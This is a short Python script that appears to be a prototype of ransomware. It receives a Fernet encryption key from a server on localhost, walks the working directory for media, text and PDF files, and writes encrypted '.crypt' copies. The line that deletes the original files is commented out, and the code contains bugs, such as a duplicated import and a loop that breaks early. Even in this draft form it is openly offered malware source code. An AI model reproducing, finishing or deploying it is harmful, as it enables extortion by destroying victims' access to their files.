import socket
import socket
import os
import pickle
from cryptography.fernet import Fernet

class client:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    def connect(self):
        self.sock.connect((self.host, self.port))
        self.key = self.sock.recv(2048)
    
    def close_conn(self):
        self.sock.close()

class encrypt:
    
    def __init__(self, key):   
        self.key = key
        self.tool = Fernet(key)
        self.exclude_list = ['.py', '.crypt', '.key']
        

    def encrpytor(self, path):
        for i in self.exclude_list:
            if path.endswith(i):
                pass
            else:
                try:
                    new_path = path + '.crypt'
                    f =  open(new_path, 'wb')

                    with open(path, 'rb') as file:
    
                        data = 'dummy'
                        while data:    
                            data = file.read()
                            encrypt_data = self.tool.encrypt(data)
                            print(len(encrypt_data))
                            f.write(encrypt_data)
                        file.close()

                    f.close()
                    #os.remove(path) 
                except  Exception as e:
                    print("error occured in encryptor: %s" % str(e))
                
                else:
                    print("encrypted sucessfully!")
                break


class dir_walk:

    def __init__(self):
        self.extensions = ['.mp4', '.txt', '.png', 'jpg','jpeg', '.pdf']

    def add_ext(self, ext):
        self.extensions.append(ext)

    def runner(self, path):
    
        for root, dirs, files in os.walk(path):
            for file in files:
                for ext in self.extensions:    
                    if file.endswith(ext):
                        ally = os.path.join(root, file)
                        print(ally)
                        yield ally

def clientConn():
    cl = client('127.0.0.1', 4567)
    cl.connect()
    secret = cl.key
    print(secret)
    e = encrypt(secret)

    dw = dir_walk()
    for j in dw.runner(os.getcwd()):
        e.encrpytor(j)

clientConn()